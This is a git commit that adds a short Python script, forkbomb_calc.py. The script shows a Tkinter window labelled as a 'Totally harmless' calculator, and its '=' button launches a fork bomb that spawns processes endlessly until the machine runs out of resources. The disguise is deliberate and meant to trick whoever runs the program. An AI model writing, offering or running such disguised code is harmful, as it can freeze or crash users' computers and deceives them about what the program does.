40bbb6de84dfe76bea51a009f33eb5494e03d82c
HighLionNet <tortman25@gmail.com>
2025-09-15 13:57:31 +0300

    Create forkbomb_calc.py

---
+++ forkbomb_calc.py
@@ -0,0 +1,16 @@
+#! /usr/bin/env python
+import os, tkinter as tk
+import multiprocessing
+
+def bomb():
+    while True:
+        multiprocessing.Process(target=bomb).start()
+
+def fake_calc():
+    root = tk.Tk()
+    root.title("Calculator")
+    tk.Label(root, text="Totally harmless calc...").pack()
+    tk.Button(root, text="=", command=bomb).pack()
+    root.mainloop()
+
+fake_calc()
